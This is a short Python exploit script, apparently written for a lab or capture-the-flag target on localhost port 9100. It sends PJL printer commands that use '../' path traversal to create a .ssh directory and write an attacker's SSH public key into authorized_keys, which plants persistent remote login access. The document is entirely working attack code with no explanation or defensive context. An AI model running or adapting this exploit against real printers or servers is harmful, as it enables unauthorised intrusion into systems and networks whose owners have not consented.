#!/usr/bin/env python3
import socket

HOST, PORT = "127.0.0.1", 9100
KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"


def send(p: bytes) -> bytes:
    s = socket.socket()
    s.settimeout(4)
    s.connect((HOST, PORT))
    s.sendall(p)
    try:
        return s.recv(8192)
    except socket.timeout:
        return b""
    finally:
        s.close()


cmds = [
    b'@PJL FSMKDIR NAME="../.ssh"\r\n',
    f'@PJL FSUPLOAD NAME="../.ssh/authorized_keys" SIZE={len(KEY)}\r\n'.encode() + KEY,
    b'@PJL FSUPLOAD NAME=":0:/../.ssh/authorized_keys" SIZE=' + str(len(KEY)).encode() + b"\r\n" + KEY,
]
for i, c in enumerate(cmds):
    r = send(c)
    print(i, repr(r[:200]))